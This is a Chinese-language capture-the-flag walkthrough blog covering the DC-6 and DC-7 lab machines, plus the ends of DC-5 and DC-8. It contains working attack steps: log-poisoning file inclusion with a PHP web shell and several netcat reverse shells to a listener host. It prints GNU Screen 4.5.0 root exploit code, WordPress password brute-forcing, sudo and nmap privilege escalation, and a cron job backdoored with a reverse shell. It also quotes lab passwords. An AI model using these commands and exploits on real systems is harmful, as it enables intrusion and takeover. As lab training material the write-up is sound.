flag\n信息收集官方文档里有一些提示说明，我们可以先看一下\n\n\n\n\n\n\n\n\n\nAs far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide soKme kind of idea as to what the vulnerability might involve.\nAnd just for the record, there is no phpmailer exploit involved. :-)翻译：据我所知，只有一个可利用的入口点可以进入（也没有 SSH）。这个特定的入口点可能很难识别，但它就在那里。您需要寻找一些与众不同的东西（随着页面的刷新而改变的东西）。这有望为漏洞可能涉及的内容提供某种想法。\n只是为了记录，没有涉及 phpmailer 漏洞利用。:-)\n&#x3D;&#x3D;&gt;大致关键的信息就是，在我们刷新网页的时候有的东西会发生改变，对应某种漏洞\n养成习惯，先顺手用nmap扫一下靶机端口运行的服务信息\n\n发现80端口正常运行着http，54235端口打开\n\n我们访问192.168.133.143\n先习惯看看Wappalyzer基本信息\n\n发现Web server是Nginx\n发现有5个窗口\n\n挨个访问，看看有没有可以利用或者交互的地方\n\n\n发现Concat窗口下有个输入框，可以实现交互效果，我们乱输入一些数据先试试\n看看变化\n\n发现url在提交时发生的跳转，并且显示了一些信息\nhttp://192.168.133.143/thankyou.php?firstname=1&lastname=2&country=australia&subject=123\n\n看得出来，网站跳转到了thankyou.php，而且我们输入的信息也被以明文方式显示出来了\n那怎么利用呢？\n我们想起之前作者给的提示，说刷新的时候会发生变化，我们刷新看看\n\n\n对比两个图可以发现，底下的年份时间发生了改变，刷新一次，增加一年\n这个肯定是有用的，但是怎么利用还是不知道\n我们先要了解这个变化肯定是有文件来调用的，而我们肯定是可以访问这个文件的，那我们就需要再次针对性的进行信息收集\n用经典的dirsearch来扫一下\n\n除去我们已经访问过的文件和响应码403的，发现有一个叫做footer.php文件，刚好和我们的发现变化的那个地方一致，也是底部文本变化\nhttp://192.168.133.143/footer.php\n\n\n发现果然是我们发现变化的那个地方，而且我们刷新时，也会同时变化\n\n文件包含所以按上面我们推到的思路，和信息的收集，\nconcat.php的底部为了显示和footer.php的实现功能，肯定是实现了文件包含，\nconcat.php把footer.php文件包含了\n&#x3D;&#x3D;&gt;我们渗透的基础思路就变成了利用的文件包含   拿到shell\n1.验证我们的想法【文件包含注入点可控参数名一般为file，当然如果出现怎么都不行的，那就可以用爆破**(fuzz)**或者我们的思路错误了】\n我们先试试能不能包含index.php\nhttp://192.168.133.143/thankyou.php?file=index.php\n\n\n发现index.php确实被我们成功包含了，那我们就可以肯定我们的思路是没有偏离了\n2.利用文件包含拿shell既然能够在thank.php里实现文件包含，那我们就试试能不能包含一些敏感文件，来获取更多信息\n1）向Nginx错误日志导入一句话🐎根据我们之前收集的信息，\n\n发现Web server是Nginx\n\n\n\n\n\n\n\n\n\nNginx访问日志：网站访问者有关的活动都记录在访问日志 &#x2F;&#x2F;access_log\nNginx错误日志：当访问错误的时候，会把错误参数保存在其中  &#x2F;&#x2F;error_log\n所以我们在我们的\n\n\n\n\n\n\n\n\n\nurl/?file= 的后面加上一句话🐎，然后因为访问错误，错误参数【一句话🐎】就会到nginx的错误日志中，然后利用我们发现的文件包含把错误日记包含在thankyou.php文件中，访问拿到shell，拿到shell\nnginx配置文件位置：**&#x2F;etc&#x2F;nginx&#x2F;nginx.conf**\n我们包含该文件看看nginx的错误日志文件位置在哪里\n\n看到文件位置\n\n\n\n\n\n\n\n\n\nerror_log：/var/log/nginx/error.log\n先输入一句话🐎，报错导入nginx错误日志\n\nkey：如果直接在网页输入一句话🐎导入错误日志是有问题的\n\n\n\n\n\n\n\n\n\n当我们访问http://192.168.133.143/thankyou.php?file=&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;\n虽然确实把这个信息导入到了 /var/log/nginx/error.log 文件里\n但是前端似乎存在过滤，会把&lt;&gt;和’’或””，替换成其他符号，所以当我们想要利用\nhttp://192.168.133.143/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=ls\n这样想利用我们导入的木马拿到shell的时候，实际上我们的木马已经被破坏了，所以根本不能执行我们想要的一系列命令，所以用抓包burp直接发送到服务器，绕过前端过滤先，这样我们的一句话🐎才能发挥它的作用\n\n所以我们执行抓包操作\n\n没有其他回显内容\n\n我们在文件包含/var/log/nginx/error.log，并利用cmd参数执行ls试试，看看是否真的把我们的木马包含进去了\n\n发现确实成功包含进去了，而且还可以执行命令\n那我们直接用nc命令反弹shell\n2）nc命令反弹shell先在kali控制台执行nc监听8888端口\nnc -l -vv -p 8888\n\n\n然后网页浏览\n\n\n\n\n\n\n\n\n\nhttp://192.168.133.144/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=nc%20-nv%20192.168.133.140%208888%20-e%20/bin/bash\n&#x2F;&#x2F;192.168.133.140是虚拟机ip，不是靶机ip\n\n返回控制台查看\n\n进入shell\n然后标准姿势，进入交互式shell\npython -c &#x27;import pty; pty.spawn(\"/bin/bash\")&#x27;\n\n\n*获得稳定的shell【不会因为ctrl+c退出，而且可以按上下键，返回之前的命令】\n\n\n\n\n\n\n\n\n\n先在shell，用Ctrl-Z将shell放到后台\n再stty raw -echo &amp;&amp; fg ; reset  \nnc -l -vv -p 8888  &#x2F;&#x2F;这个不用输入，是自动执行后台的命令返回到前台\n&#x2F;&#x2F;stty 设置终端端口设备的接口选项\n&#x2F;&#x2F;echo 表示回显，比如当-echo时，输入ls后按回车，仍然会看到ls\n&#x2F;&#x2F;fg把shell提到前台来\n&#x2F;&#x2F;reset表示重启终端，此时的终端为我们靶机的shell窗口，所以不容易被退出或者中断\n\n成功获得全交互式shell\n3.提权拿到shell以后，我们权限明显是不够的，所以我们需要垂直提权，拿到最高权限\n先看看存不存在suid方式提权\nfind / -perm -u=s -type f 2>/dev/null\n\n\n似乎没啥可以利用提权的点，但是有个\n\n/bin/screen-4.5.0\n\n看起来有点陌生，我们百度/google就要利用起来了\n\n\n\n\n\n\n\n\n\nGNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。\n用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。\nGNU Screen可以看作是窗口管理器的命令行界面版本。\n它提供了统一的管理多个会话的界面和相应的功能。\n看来是属于suid当中的漏洞脚本提权，那脚本怎么找呢\n1）searchsploit找提权脚本文件我们可以使用searchsploit搜索软件相关漏洞有没有可以利用的脚本，而且它的版本号也写出来了\n\n发现有两个文件，一个sh脚本文件，一个txt文本的（POC）\n看到有sh脚本文件路径，先查看其内容是什么，看看能不能利用\n\n发现是个c语言脚本\n\n看来我们找的是正确的，我们分析一下该脚本文件，看看怎么利用其来提权\n\n\n\n\n\n\n\n\n\n仔细看其实这里面有两个C语言脚本\n【EOF为文结束符号】\n而且需要保存到两个c文件中去libhax.crootshell.c\n然后用gcc命令gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.cgcc -o /tmp/rootshell /tmp/rootshell.c\n对两个c文件进行编译，从而生成libhax.sorootshell\n然后在把两个c文件和两个编译后生成的文件传入靶机后\n在靶机shell挨个执行后面的命令，从而拿到root权限\necho &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so... /tmp/rootshell                            \n上半部分\n#include #include \n#include \n#include \n__attribute__ ((__constructor__))\nvoid dropshell(void)&#123;\n    chown(\"/tmp/rootshell\", 0, 0);\n    chmod(\"/tmp/rootshell\", 04755);\n    unlink(\"/etc/ld.so.preload\");\n    printf(\"[+] done!\\n\");\n&#125;\n\n\n下半部分\n#include #include \nint main(void)&#123;\n    setuid(0);\n    setgid(0);\n    seteuid(0);\n    setegid(0);\n    execvp(\"/bin/sh\", NULL, NULL);\n&#125;\n\n\n&#x3D;&#x3D;&gt;\n我们需要在靶机的&#x2F;tmp目录下，传入\n\n\n\n\n\n\n\n\n\nlibhax.sorootshellflag.sh   &#x2F;&#x2F;内容为后面的命令内容\n这三个文件\n我们先在自己的kali机上把这两个文件准备好\n我们也可以先到我们kali机的/tmp目录下\n先执行\ncat  /tmp/libhax.c\n#include \n#include \n#include \n__attribute__ ((__constructor__))\nvoid dropshell(void)&#123;\n    chown(\"/tmp/rootshell\", 0, 0);\n    chmod(\"/tmp/rootshell\", 04755);\n    unlink(\"/etc/ld.so.preload\");\n    printf(\"[+] done!\\n\");\n&#125;\nEOF\ngcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c\nrm -f /tmp/libhax.c\n\n\n再执行\ncat  /tmp/rootshell.c\n#include \nint main(void)&#123;\n    setuid(0);\n    setgid(0);\n    seteuid(0);\n    setegid(0);\n    execvp(\"/bin/sh\", NULL, NULL);\n&#125;\nEOF\ngcc -o /tmp/rootshell /tmp/rootshell.c\nrm -f /tmp/rootshell.c\n\n\n【虽然会报错，但是是正常的，不影响编译后产生的文件的执行】\n执行后\n\n\n\n\n\n\n\n\n\nlibhax.so  rootshell这两个文件就生成了\n然后我们的flag.sh\necho \"[+] Now we create our /etc/ld.so.preload file...\"\ncd /etc\numask 000 # because\nscreen -D -m -L ld.so.preload echo -ne  \"\\x0a/tmp/libhax.so\" # newline needed\necho \"[+] Triggering...\"\nscreen -ls # screen itself is setuid, so...\n/tmp/rootshell \n\n\n\n2）nc向靶机传入脚本提权文件当然如果你用蚁剑连接的shell的话，直接把文件拖进去就行，简单一点\n如果用nc的话当然也不难\n先是kali机控制台【目前状态为/tmp下】\n\n\n\n\n\n\n\n\n\nnc -lvp 8888 &lt; libhax.so  &#x2F;&#x2F; &lt; 表示传入\n\n靶机shell【必须在/tmp目录下才能执行nc】\n\n\n\n\n\n\n\n\n\ncd /tmpnc 192.168.133.140 8888 &gt; libhax.so  &#x2F;&#x2F;&gt;表示传出接收文件,192.168.133.140为kali机ip\n\n看到传入成功\nrootshell和flag.sh文件类似，不再展示\n最后成功传入\n\n3）执行脚本进行提权\n传入完成后，给flag.sh加上执行权限\nchmod +x flag.sh\n\n然后执行即可\n./flag.sh\n\n\n*出现意外\n不知道有没有朋友也遇到这种报错\n最后一步执行rootshell的时候，弹出这个命令，我搜索了一下，猜测是不是c语言脚本写错了，但是仔细检查并没有出错\n然后我们看了看我们的kali和靶机的gcc版本\n发现\n\n\n\n\n\n\n\n\n\nkali机是：11.3.0-1\n靶机是：4.9.2\n但是编译器不同对结果应该没什么太大影响\n但我还是试试能不能在靶机的shell里执行gcc，运行两个c语言脚本文件，得到rootshell和libhax.so文件\n但是又出现\n\n原来是缺少环境变量，导致无法执行\n给cc1配置环境变量\nlocate cc1\n\nPATH=\"$PATH\":/usr/lib/gcc/x86_64-linux-gnu/4.9/cc1\n\nexport PATH\n\n\n\n然后我们从简，直接在靶机shell执行\ncat  /tmp/libhax.c\n#include \n#include \n#include \n__attribute__ ((__constructor__))\nvoid dropshell(void)&#123;\n    chown(\"/tmp/rootshell\", 0, 0);\n    chmod(\"/tmp/rootshell\", 04755);\n    unlink(\"/etc/ld.so.preload\");\n    printf(\"[+] done!\\n\");\n&#125;\nEOF\ngcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c\nrm -f /tmp/libhax.c\n\n\n\ncat  /tmp/rootshell.c\n#include \nint main(void)&#123;\n    setuid(0);\n    setgid(0);\n    seteuid(0);\n    setegid(0);\n    execvp(\"/bin/sh\", NULL, NULL);\n&#125;\nEOF\ngcc -o /tmp/rootshell /tmp/rootshell.c\nrm -f /tmp/rootshell.c\n\n成功执行\n\n关键来了【期待】我们执行我们的flag.sh脚本【这里是重复的flag.sh，所以名字为flag.sh.1】\n\n\n终于解决问题后【卡了一天了】\n终于成功提权\n\n到/root目录下\n拿到flag\n\n\n\n\n\n\n\n\n\n\n888b    888 d8b                                                      888      888 888 888 \n8888b   888 Y8P                                                      888      888 888 888 \n88888b  888                                                          888      888 888 888 \n888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 \n888 Y88b888 888 d88P\"   d8P  Y8b      888  888  888 d88\"\"88b 888P\"   888 .88P 888 888 888 \n888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P \n888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 \"88b  \"   \"   \"  \n888    Y888 888  \"Y8888P \"Y8888        \"Y8888888P\"   \"Y88P\"  888     888  888 888 888 888\n\n\nOnce again, a big thanks to all those who do these little challenges,and especially all those who give me feedback - again, it&#39;s all greatlyappreciated.  :-)\nI also want to send a big thanks to all those who find the vulnerabilitiesand create the exploits that make these challenges possible.\n翻译：                                                                                      \n再次非常感谢所有完成这些小挑战的人，尤其是所有给我反馈的人——再一次，这一切都很棒赞赏。 :-)\n我还要非常感谢所有发现漏洞的人并创造使这些挑战成为可能的漏洞。\n吐血了，果然是中级，顺便提醒一下大家，非必要不要更新\n一个旗子找完，游戏结束【吐血了】\n\n六、DC-6[中级]only one flag\n信息收集先抬手nmap扫描一下\n\n\n\n\n\n\n\n\n\n\n发现22端口：运行着ssh【默认端口】80端口：运行着http【默认端口】\n看来可能是需要ssh连接拿shell\n\n这个靶机好像需要配置hosts文件，不然通过ip是访问不了网站的\n\n然后访问试试\n好了【但是好像有点卡】\n界面和DC2一样【梦回DC2，操作应该差不多】\n\n\n习惯看看wappalyzer\n\n看到CMS是WordPress 5.1.1\n想到可以利用一下这个版本的漏洞，拿到一些敏感信息\n\n我们再看看网站上有没有可以利用的信息\nabout us里似乎全是文本内容没啥提示\n看到有个concact us，可能有交互利用的地方\n\n虽然看起来没有但是其实是有的\n通过concact us页面的url，在后面加上用户的名字就可以\n\n\n\n\n\n\n\n\n\nhttp://xxx/admin  \n&#x2F;&#x2F;当然其实并不太重要，不过可以试试看，能不能留言xss然后挟持管理员账户，不过这并不是实际情况，所以可以自己留言，然后登录看看\n\n1.wpscan爆破出用户名【dc2里搞过】看到wordpress先用wpscan搞一下\nwpscan --url wordy -e u\n\n\n得到用户名\n\n\n\n\n\n\n\n\n\nadminmarkgrahamsarahjens\n我们创建一个user.txt\n哪在哪里登录呢？我们在开始页面并没有看到登录窗口\n我们用dirb扫一下\ndirb http://wordy\n\n\nhttp://wordy/wp-admin/\n\n\n\n2.wpscan爆破密码我们再找一个密码表，这里用和DC2 cewl命令爬一下网站，看看能不能利用其中有没有密码\ncewl wordy > pass.txt\n\n然后就得到一个密码【擦，难道和dc2一样的】\n然后我们开始进行爆破登录【注意需要root权限】\nwpscan --url wordy --usernames user.txt --passwords pass.txt\n\n\n结果肯定是不行的【肯定不和DC2一样】\n&#x3D;&#x3D;&gt;\n所以这里我们需要找一个完整的密码字典\n\n\n\n\n\n\n\n\n\n需要用到wordpress的密码字典，kali自带rockyou.txt\n由作者提示得【也就是把密码一部分告诉你了】\n\n\n\n\n\n\n\n\n\n\nwpscan --url http://wordy --usernames user.txt --passwords /usr/share/wordlists/rockyou.txt|grep k01 -t 5\n&#x2F;&#x2F;-t是添加线程数，默认是5，多加几个可以更快一些\n如果直接跑的有点久了\n。。。。。。。【睡了一晚上，不知道好久跑出来的】\n【七千万密码】\n\n最后得到\n\n\n\n\n\n\n\n\n\n\nusername:markpassword:helpdesk01\n虽然只有一个用户但是够了\n\n3.登录网站找信息登录后发现是一个wordpress的后台网站\n\n在左侧我们发现了一个新的东西叫做\nActivity monitor\n\n\n\n\n\n\n\n\n\n是一款网站用户活动监控插件，我们用户登录的ip和其他信息都会被监控\n&#x2F;&#x2F;那么我们是不是可以试试找找这个插件有没有漏洞，从而通过这个漏洞拿到shell或者其他更高权限用户的信息\n\n\n我们查一下\nsearchsploit activity monitor\n\n\n发现果然是有的，只是不知道能不能利用\n我们主要找后面两个和wordpress相关的\n\n\n\n\n\n\n\n\n\n45274.html是命令注入50110.py是远程命令执行\n1）50110.py【有问题，不建议用】感觉py更方便一些，我们先查看内容\ncat /usr/share/exploitdb/exploits/php/webapps/50110.py\n\n\n看来只需要ip，以及用户名和密码即可进入shell\n我们运行一下\npython /usr/share/exploitdb/exploits/php/webapps/50110.py\n\n\n\n然后我按我的输入\n\n\n\n\n\n\n\n\n\n192.168.133.145markhelpdesk01\n\n进入shell\n\n然后固定姿势，进入交互式shell\npython -c &#x27;import pty; pty.spawn(\"/bin/bash\")&#x27;\n\n但是会报错\n似乎不能使用python命令，一使用就退出shell\n\n那就看起来有点难受了，再试试能不能进入稳定shell\n\n\n\n\n\n\n\n\n\n先ctrl+z然后执行stty raw -echo ; fg ; reset  \n结果卡死了\n算了算了，就这样看吧\n【我这里把py脚本导入一个新的文件里（1.py），把我的ip，用户名，密码都写了进去，就不用退出了又重新输入了】\n\n先退到主目录看看有几个用户\n但是发现好像有点问题，似乎有的命令执行就和脚本冲突，那就用\n\n2）45274.html那我们先不管它，我们还有一个命令注入的没有用，\n我们先查看一下内容\ncat /usr/share/exploitdb/exploits/php/webapps/45274.html\n\n\n我们把这个文件导入一个新文件中【1.html】\n主要是修改这里的网站网址和监听本地ip，改成我们的wordy和kali机的ip\nhttp://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools\n\n==>\n\nhttp://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools\n\n\nnc -nlvp 127.0.0.1   ==>   nc 192.168.133.140\n\n\n然后因为是html文件，我们可以直接用浏览器打开，\n\n当然也可以\npython -m http.server 8008\n\n然后以浏览器方式访问本地ip:8008，再打开里面1.html文件\n\nnc监听拿shell然后我们发现有个\nSubmit request的按钮，看来是发送请求，然后nc反弹shell\n\n\n\n\n\n\n\n\n\n注意监听端口是9999\n\n然后我们在浏览器点击一下Submit request\n\n连接到 shell\n这个比脚本的那个就更加方便一下了，\n\n固定姿势\npython -c &#x27;import pty; pty.spawn(\"/bin/bash\")&#x27;\n\n然后进入稳定式shell\n\n\n\n\n\n\n\n\n\n先ctrl+z然后执行stty raw -echo ; fg ; reset  \n\n\n然后开始找找有没有其他用户的密码信息\n先到 /home 里查看一下，发现了除了admin其他三个用户目录\n\n我们先进我们登录成功的mark目录查看\n\n发现有个things-to-do.txt文本文件\n查看内容\ncat things-to-do.txt\n\n\n\n\n\n\n\n\n\n\n\nThings to do:\n\nRestore full functionality for the hyperdrive (need to speak to Jens)\nBuy present for Sarah&#39;s farewell party\nAdd new user: graham - GSo7isUM1D4 - done\nApply for the OSCP course\nBuy new laptop for Sarah&#39;s replacement\n\n意思是：\n要做的事情：\n\n恢复超光速引擎的全部功能（需要与 Jens 交谈）\n为莎拉的告别派对购买礼物\n添加新用户：graham - GSo7isUM1D4 - 完成\n申请OSCP课程\n为莎拉购买新的笔记本电脑\n\n&#x2F;&#x2F;关键信息我们得到了graham用户的密码【我也想考OSCP，哭唧唧】\n我们根据我们拿到graham的信息，登录ssh\n【当然在原有shell里利用su命令切换用户graham也是可以的，但是ssh有颜色，看起来好看一些】\n【因为之前就看到运行着ssh，没必要再在登录一次网站，反正不是最高权限】\n\n\n\n\n\n\n\n\n\nssh graham@192.168.133.145 -p 22    &#x2F;&#x2F;靶机ip  ssh运行端口密码：GSo7isUM1D4\n\n然后我们看看我们有哪些命令可以执行\nsudo -l\n\n\n看到是有jens目录下一个脚本文件的运行权限，而且不需要jens的密码，就可以他的身份下运行了【mark我试了的，没有权限】\n以其他用户身份运行脚本，实现切换用户我们先查看一下内容\ncat /home/jens/backups.sh\n\n\n发现是执行一些命令，\n但是我们的目的想获得jens的登录权限，我们在脚本文件中追加一些命令\necho \"/bin/bash\"  >> /home/jens/backups.sh\n\n这样的话当我们以jens身份运行这个脚本时，当执行/bin/bash时，就算我们现在是graham，也会切换成jens，这也得益于可以nopasswd运行\n\n\n\n\n\n\n\n\n\nsudo -u jens /home/jens/backups.sh\n&#x2F;&#x2F;注意哦，这里是需要以jens身份运行【毕竟他给了我们用他身份执行权限】才可以实现切换用户，如果直接运行还是graham用户，就如下图一样\n\n切换用户成功，\n我们先看看jens有哪些命令可以执行\nsudo -l\n\n\n终于，发现了root的，我们可以执行nmap命令【只有管理员可以】，那么如何拿到权限呢\n4.nmap提权1.旧版nmap（2.02-5.21）存在交换模式，可利用提权\nnmap --interactive\n\n之后执行:\nnmap> !sh\nsh-3.2# whoami\nroot\n\nmsf中的模块为：\nexploit/unix/local/setuid_nmap\n\n2.新版较新版可使用 --script 参数：\n\n\n\n\n\n\n\n\n\n先写入一条命令echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; getshell再–script参数，执行sudo nmap --script=getshell\n查看一下靶机的nmap版本\n7.4还是挺高的\n\n那我们写一个脚本，里面加上命令，再用新版nmap运行这个脚本\necho \"os.execute(&#x27;/bin/sh&#x27;)\" > getshell\n\n\n\n\n\n\n\n\n\n\n\n\n注意哈，jens只有在~目录下才可以执行echo命令，不然是不可以的\n\nsudo nmap --script=getshell\n\n\n成功提权，然后我们查找flag【没输入回显有点小难受，但是不影响拿flag】\n\n\n\n\n\n\n\n\n\n\nYb        dP 888888 88     88         8888b.   dP\"Yb  88b 88 888888 d8b \n Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P \n  YbdPYbdP   88\"\"   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88\"\"   `\"&#x27; \n   YP  YP    888888 88ood8 88ood8     8888Y\"   YbodP  88  Y8 888888 (8)\n\nCongratulations!!!\nHope you enjoyed DC-6.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.\nIf you enjoyed this CTF, send me a tweet via @DCAU7.\n意思是：恭喜！！！\n希望你喜欢 DC-6。只是想向所有这些人表示衷心的感谢谁提供了反馈，谁花时间完成了这些小事挑战。\n如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。\n一个旗子找完，游戏结束\n\n七、DC-7[中级]only one flag\n\n\n\n\n\n\n\n\n\nhint：While it&#39;s kind of a logical progression from an earlier DC release (I won&#39;t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably won&#39;t succeed.\nWhat you will need to do, is to think &quot;outside&quot; of the box.\nWaaaaaay &quot;outside&quot; of the box. :-)\n虽然这是较早的 DC 版本的一种合乎逻辑的进展（我不会告诉你是哪一个），但其中涉及到一些新概念，但你需要自己弄清楚这些。:-) 如果您需要使用暴力破解或字典攻击，您可能不会成功。\n您需要做的是跳出框框思考。\nWaaaaaay“在盒子外面”。:-)\n信息收集nmap扫描查看开放端口\n\n发现运行着22和80端口，22端口运行着ssh\n先看看框架和语言\n\nCMS是Drupal 8，看来这是关键【好家伙，DC1重现】\n再顺手扫一下\n\n看到有一个登录窗口页面\n\n那我们就先想办法怎么获得一个用户的账号密码\n\n1.跳出框架\n\n\n\n\n\n\n\n\n这里我开始以为是思维的框架，结果是靶机的框架，我们需要用搜素工具，得到我们的信息，而不是死脑筋在靶机上苦苦找漏洞或者蛮用爆破\n在实际的环境中，我们也是这样的，在网站之外获得网站的信息，这也是收集信息的一个重要的办法\n\n在网站的最底下我们发现了\n@DC7USER\n\n这应该是网站的搭建者，对于像这种小网站，一般可能是在一些平台，比如github上搭建、挂载的【比如我的博客】，所以在这些平台上，我们很有可能得到一些我们想要的敏感信息和文件\n所以我们用bing查一下【国内搜索引擎很难搜到，谷歌要魔法，我写这DC7这几天不方便魔法，所以bing最好】\n还真找到了\nhttps://github.com/Dc7User/staffdb/blob/master/config.php\n\n\n|                                                            |\n\n得到账号和密码，以及数据库的名字，看来我们确实跳出了框架\n我们利用账号密码在我们之前的网站登录一下试试\n\n\n\n\n\n\n\n\n\n$username &#x3D; “dc7user“;$password &#x3D; “MdR3xOgB7#dW“;  \n\n结果报错，看来这个账号并不是在这个页面登录的\n2.ssh登录我们根据之前得到的信息知道，22端口运行着ssh，我们用其登录试试\n\n\n\n\n\n\n\n\n\n$username &#x3D; “dc7user“;$password &#x3D; “MdR3xOgB7#dW“;  \n\n好家伙，果然是ssh的账号密码\n我们来找找有没有什么有用的东西\nls\n\n\n我们先打开backups文件夹\n\n发现是两个.gpg文件\n\n\n\n\n\n\n\n\n\ngpg文件就是一个加密文件\n而我们现在没有信息和密码，所以我们再看看另一个文件\n\n\n\n\n\n\n\n\n\n返回上级目录cat mbox \n\n发现是root用户命令执行的记录\n发现了\n\n\n\n\n\n\n\n\n\nDatabase dump saved to /home/dc7user/backups/website.sql&#x2F;&#x2F;数据库信息存入website.sql文件&#x2F;&#x2F;然后root执行了加密脚本加密数据库文件\n\n*定时任务【cron（crond）】我们发现在root用户执行加密脚本之前有一个Cron\n\n\n\n\n\n\n\n\n\nCron发现是定时任务，代表过一段时间就执行一次，以来更新数据库备份文件【backups】\n这是个定时任务 用root 运行/opt/scripts/backups.sh\n\n*关键思路查看下权限什么的，发现www-data拥有执行和写的权限，我们当前权限没有写权限，看来没办法动手脚了。\n\n但是如果我们获得了www-data的shell 那就可以写点东西进去，然后依靠计划任务，用root去运行，然后反弹shell，那么我们可以获得了root权限的shell了。\n3.drush命令对drupal修改用户名和密码我们按路径查看该脚本内容\n\n我们发现果然是个加密数据库文件的脚本，但是我们仍然不知道密码\n但是我们发现了数据库文件似乎被更改过\n出现了一个新的命令\n\n\n\n\n\n\n\n\n\ndrush&#x2F;&#x2F;drush命令是在drupal框架中进行配置的命令，可以修改用户名和密码，&#x2F;&#x2F;但是drush必须在drupal安装目录下进行，所以我们可以按脚本给的cd /var/www/html/\n\n\n\n\n\n\n\n\n\n\ncd /var/www/htmldrush user-password admin:123456&#x2F;&#x2F;用户名admin和密码123456\n\n然后成功修改用户admin的密码为123456\n\n4.登录网站当我们输入我们修改后的密码后，成功登录admin用户\n\n然后我们统合一下思路，我们进入了网站后，应该如何拿到shell，那肯定需要写木马或者反弹shell\n那么我们就需要找到可以修改并增加php文件的的地方\n我们先打开content页面，发现有开始.html页面\n\n点开查看\n\n发现可以修改内容，看来我们可以试试修改它，变成我们的木马文件\n结果发现文件只能以html形式执行，而不能以php形式执行\n\n添加php执行插件drupal框架可以添加php文件插件，从而能修改为php文件\n\n点击\ninstall new module\n\n\n在url里填写\nhttps://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz\n\n然后install\n\n但是我这里显示无法连接网站，那我们直接上传插件文件也是可以的\n\n然后添加成功\n\n然后在FILTERS处\n启动插件【勾选】\n\n最后记得还要install\n\n然后我们的文件就可以以php文件形式执行了\n加入一句话木马\n【记住Text foromat要改成PHP code】\n然后保存即可\n5.蚁剑连接getshell因为我们是在welcome页面里插入一句话木马，所以直接连接靶机ip就行\n192.168.133.146\n\n\n连接成功\n启动虚拟终端\n\ngetshell\n\n6.反弹shell拿www-data我们先开始监听9999端口\nnc -lvvp 9999\n\n\n我们在蚁剑的shell上\n开始反弹shell\nnc -e /bin/bash 192.168.133.140 9999\n\n\n然后拿到反弹shell\n\n进入交互式shell\npython -c \"import pty;pty.spawn(&#x27;/bin/bash&#x27;)\"\n\n\n7.利用定时任务【cron】提权root我们向 backups.sh写入反弹shell命令\necho \"nc 192.168.133.140 12345 -e /bin/bash\" >> /opt/scripts/backups.sh\n\n\n然后我们再开一个控制台开始监听12345端口\n\n然后我们等待定时任务执行，便可以拿到shell【时间有点久】\n\n连接成功后，到root目录查看flag\n\n\n\n\n\n\n\n\n\n\n888       888          888 888      8888888b.                             888 888 888 888 \n888   o   888          888 888      888  \"Y88b                            888 888 888 888 \n888  d8b  888          888 888      888    888                            888 888 888 888 \n888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 \n888d88888b888 d8P  Y8b 888 888      888    888 d88\"\"88b 888 \"88b d8P  Y8b 888 888 888 888 \n88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P \n8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      \"   \"   \"   \"  \n888P     Y888  \"Y8888  888 888      8888888P\"   \"Y88P\"  888  888  \"Y8888  888 888 888 888\n\n\nCongratulations!!!\nHope you enjoyed DC-7.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and all those who have taken the time to complete these littlechallenges.\nI&#39;m sending out an especially big thanks to:\n@4nqr34z@D4mianWayne@0xmzfr@theart42\nIf you enjoyed this CTF, send me a tweet via @DCAU7.\n意思是：恭喜！！！\n希望你喜欢 DC-7。只是想向所有这些人表示衷心的感谢提供反馈的人，以及所有花时间完成这些小事的人挑战。\n我要特别感谢：\n@4nqr34z@D4mianWayne@0xmzfr@心42\n如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文\n一个旗子找完，游戏结束\n八、DC8[初级]only one flag\n\n\n\n\n\n\n\n\n\nhint:This challenge is a bit of a hybrid between being an actual challenge, and being a &quot;proof of concept&quot; as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.\nThe &quot;proof of concept&quot; portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.\nThe ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.\nYou probably wouldn&#39;t even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it&#39;s definitely there and doing it&#39;s job.\n意思是：这个挑战有点混合实际挑战和“概念证明”，即在 Linux 上安装和配置的双因素身份验证是否可以防止 Linux 服务器被利用。\n这个挑战的“概念证明”部分最终是由于 Twitter 上关于双因素身份验证和 Linux 的问题，以及@theart42 的建议。\n此挑战的最终目标是绕过双重身份验证，获取 root 权限并读取唯一标志。\n除非您尝试通过 SSH 登录，否则您可能甚至不知道已安装和配置了双因素身份验证，但它肯定存在并且可以正常工作。\n信息收集 